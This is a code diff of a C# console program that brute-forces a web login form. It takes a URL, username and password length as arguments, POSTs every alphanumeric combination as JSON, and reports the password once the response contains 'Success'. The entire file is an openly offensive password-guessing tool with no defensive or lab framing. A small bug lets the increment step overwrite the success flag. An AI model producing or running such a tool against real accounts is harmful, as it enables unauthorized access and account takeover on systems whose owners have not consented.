@@ -1,88 +1,112 @@
 using System;
 using System.Net.Http;
-using System.Threading.Tasks;
-using System.Collections.Generic;
 using System.Text;
+using System.Threading.Tasks;
 
-namespace BruteForcePassword
+class Program
 {
-    class Program
+    static async Task Main(string[] args)
     {
-        // Method to generate all possible combinations of symbols, digits, uppercase, and lowercase letters
-        public static IEnumerable<string> GenerateCombinations(string characters, int length)
+        // Check if the correct number of arguments is provided
+        if (args.Length != 3)
         {
-            if (length == 0)
-                yield return "";
-            else
-            {
-                foreach (var c in characters)
-                {
-                    foreach (var suffix in GenerateCombinations(characters, length - 1))
-                    {
-                        yield return c + suffix;
-                    }
-                }
-            }
+            Console.WriteLine("Usage: dotnet run <url> <username> <passwordLength>");
+            return;
         }
 
-        // Method to attempt login with a given username and password
-        public static async Task<bool> TryPassword(string username, string password)
-        {
-            string url = "http://example.com/login";  // Replace with the actual server URL
-            var data = new Dictionary<string, string>
-            {
-                { "username", username },  // Replace "username" with the actual field name for the username
-                { "password", password }   // Replace "password" with the actual field name for the password
-            };
+        // Read command-line arguments
+        string url = args[0];
+        string username = args[1];
+        int passwordLength;
 
-            using (HttpClient client = new HttpClient())
+        // Validate password length argument
+        if (!int.TryParse(args[2], out passwordLength))
+        {
+            Console.WriteLine("Error: passwordLength must be an integer.");
+            return;
+        }
+
+        // Start the brute-force process
+        await BruteForcePassword(url, username, passwordLength);
+    }
+
+    static async Task BruteForcePassword(string url, string username, int passwordLength)
+    {
+        using (HttpClient client = new HttpClient())
+        {
+            // Generate all possible combinations of characters for the password
+            string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            int charsetLength = charset.Length;
+            char[] password = new char[passwordLength];
+
+            for (int i = 0; i < passwordLength; i++)
             {
+                password[i] = charset[0]; // Initialize with the first character in the charset
+            }
+
+            bool success = false;
+
+            // Attempt passwords by iterating through all possible combinations
+            while (!success)
+            {
+                // Create the password string from the char array
+                string passwordString = new string(password);
+
+                // Create the HTTP POST request body
+                var data = new
+                {
+                    username = username,
+                    password = passwordString
+                };
+
+                // Convert the data into JSON format
+                var json = Newtonsoft.Json.JsonConvert.SerializeObject(data);
+                var content = new StringContent(json, Encoding.UTF8, "application/json");
+
                 try
                 {
-                    var content = new FormUrlEncodedContent(data);
+                    // Send the HTTP POST request
                     HttpResponseMessage response = await client.PostAsync(url, content);
                     string responseString = await response.Content.ReadAsStringAsync();
 
-                    // Logging the current attempt
-                    Console.WriteLine($"Attempt: {username} | {password}, Response: {response.StatusCode}");
+                    Console.WriteLine($"Trying: {passwordString} - Server Response: {response.StatusCode}");
 
-                    // Check if the response indicates a successful login
-                    if (responseString.Contains("Success"))  // Replace with the appropriate success condition
+                    // Check if the response contains "Success"
+                    if (responseString.Contains("Success"))
                     {
-                        Console.WriteLine($"Password found for user {username}: {password}");
-                        return true;
+                        Console.WriteLine($"Success! The correct password is: {passwordString}");
+                        success = true;
                     }
                 }
-                catch (Exception e)
+                catch (Exception ex)
                 {
-                    Console.WriteLine($"Error sending request: {e.Message}");
+                    Console.WriteLine($"Error: {ex.Message}");
+                    return;
                 }
+
+                // Increment the password to the next combination
+                success = IncrementPassword(password, charset, charsetLength);
             }
-
-            return false;
         }
+    }
 
-        // Method to iterate through all possible combinations and attempt login
-        public static async Task BruteForcePassword(string username, int length)
+    static bool IncrementPassword(char[] password, string charset, int charsetLength)
+    {
+        // Increment the password by moving through the character set
+        for (int i = password.Length - 1; i >= 0; i--)
         {
-            string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/`~";  // All letters, digits, and symbols
+            int currentCharIndex = charset.IndexOf(password[i]);
 
-            foreach (var combination in GenerateCombinations(characters, length))
+            if (currentCharIndex < charsetLength - 1)
             {
-                if (await TryPassword(username, combination))
-                {
-                    break;  // Exit if the correct password is found
-                }
+                password[i] = charset[currentCharIndex + 1];
+                return false; // Continue brute-forcing
             }
+
+            password[i] = charset[0]; // Reset this character to the first in the charset and move to the next one
         }
 
-        static async Task Main(string[] args)
-        {
-            string username = "myusername";  // Replace with the actual username
-            int passwordLength = 4;          // Set the length of the password to guess
-
-            // Start the brute force password guessing
-            await BruteForcePassword(username, passwordLength);
-        }
+        // If we've looped through all possible combinations, return true (stop brute-forcing)
+        return true;
     }
 }
